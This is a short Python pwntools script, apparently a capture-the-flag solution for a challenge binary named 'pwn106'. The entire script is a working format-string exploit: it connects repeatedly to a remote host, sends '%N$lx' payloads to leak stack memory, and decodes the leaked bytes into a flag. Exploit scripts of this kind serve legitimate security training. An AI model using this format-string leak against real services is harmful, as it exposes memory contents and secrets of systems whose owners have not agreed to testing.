from pwn import *

exe = './pwn106'
elf = context.binary = ELF(exe, checksec=False) # will exec checksec
#context.log_level = 'debug'     # a lot of debug info
flag = b''

#p = process(exe)                # start program
for i in range(1,15):
    p = remote('10.10.43.104', 9006)
    #p = process(exe)
    p.recvuntil(b'giveaway: ')
    p.sendline(b'[beg]%'+str(i).encode()+b'$lx[end]')

    leak = p.recvuntil(b'[end]').strip()
    leak = leak.split(b'[beg]')[1]
    leak = leak.split(b'[end]')[0]
    flag += unhex(leak.decode('UTF-8'))[::-1]
    info(str(i)+' > '+'{a}'.format(a=unhex(leak.decode('UTF-8'))[::-1]))
    p.close()

print(flag)

